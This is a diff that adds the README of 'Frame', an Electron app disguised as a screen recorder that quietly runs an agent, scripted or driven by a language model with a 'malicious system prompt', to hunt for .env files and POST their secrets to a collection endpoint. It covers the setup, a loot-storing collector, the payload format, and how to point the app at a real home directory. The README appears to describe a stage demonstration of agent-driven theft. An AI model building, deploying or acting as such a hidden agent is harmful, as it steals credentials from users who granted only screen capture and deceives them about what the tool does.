@@ -1,0 +1,94 @@
+# Frame
+
+A screen recorder that takes screenshots on a timer and quietly runs an agent
+that hunts for `.env` files and POSTs them to a collection endpoint.
+
+Cover story: it only asks for Screen Recording, so it looks like a preview tool.
+
+![run](docs/screenshot-run.png)
+
+## Run
+
+```bash
+npm install
+node scripts/patch-plist.js     # adds the Screen Recording usage string to the dev binary
+npm run collect                 # terminal 1 - collector on :8787
+npm start                       # terminal 2 - the app
+```
+
+macOS will not deliver frames until Screen Recording is granted:
+
+1. click **Allow Screen Recording** in the app (opens Privacy settings), or
+2. Privacy & Security → Screen Recording → enable **Electron**,
+3. **restart the app**.
+
+The preview stays striped until then; the agent works either way.
+
+## Demo
+
+1. Open Settings, set the endpoint. For a self-contained run use
+   `http://127.0.0.1:8787/collect`; for the real one, the domain from the team.
+2. Watch the collector tab (`http://127.0.0.1:8787/`) — it lists what arrives and
+   stores the files in `collector/loot/`.
+3. Click **Start assistant**. The transcript shows the find → read → send chain,
+   and the banner reports the total. The point to make on stage: the app never
+   asked where the files are, and the user only granted screenshots.
+
+Point it at `~/demo-fixtures` (default when that folder exists) so the demo is
+deterministic: one `.env`, one `.env.production`, one `.env.local`, plus a
+decoy inside `node_modules` that gets skipped. Delete that folder to scan the
+real home directory instead.
+
+## Settings
+
+![settings](docs/screenshot-settings.png)
+
+## Modes
+
+- **scripted** (default) — no API key. Walks the same tool functions the model
+  would call, so the bytes and requests are real.
+- **llm** — OpenAI-compatible tool calling. Set base URL, model and key in
+  Settings. The malicious prompt lives in `agent/prompt.js`.
+
+The agent is allowed 10 tool turns, reads max 32 KB per file, and skips
+`node_modules`, `.git`, `Library`, `dist`, `build`, `.next`, `venv`.
+
+## Endpoint contract
+
+`POST` with `content-type: application/json`:
+
+```json
+{
+  "host": "Isaac.local",
+  "user": "isaac",
+  "file": "/Users/isaac/app/.env",
+  "capturedAt": "2026-10-24T18:08:29.000Z",
+  "content": "DATABASE_URL=..."
+}
+```
+
+`x-ghost: 1` is set as a marker header. Any endpoint that answers 2xx works;
+the built-in collector writes to disk and prints a line.
+
+## Layout
+
+```
+main.js               window, capture loop, IPC
+preload.js            context bridge
+renderer/             UI (plain HTML/CSS/JS)
+agent/prompt.js       the malicious system prompt
+agent/tools.js        find / read / post
+agent/run.js          scripted + llm loops
+agent/cli.js          headless run: node agent/cli.js --root ~/demo-fixtures
+collector/server.js   throwaway receiver
+scripts/patch-plist.js, scripts/cdp-check.js
+```
+
+## Notes
+
+- Screenshots never leave the machine in this MVP; only `.env` content is sent.
+- Config sits in `~/Library/Application Support/frame-agent/config.json`.
+- `npm run agent:cli -- --url http://127.0.0.1:8787/collect --root ~/demo-fixtures`
+  runs the whole chain without opening the window.
+- Screen Recording for the dev binary is granted to **Electron**, not to Frame —
+  after `npm install` the binary path changes and macOS may ask again.
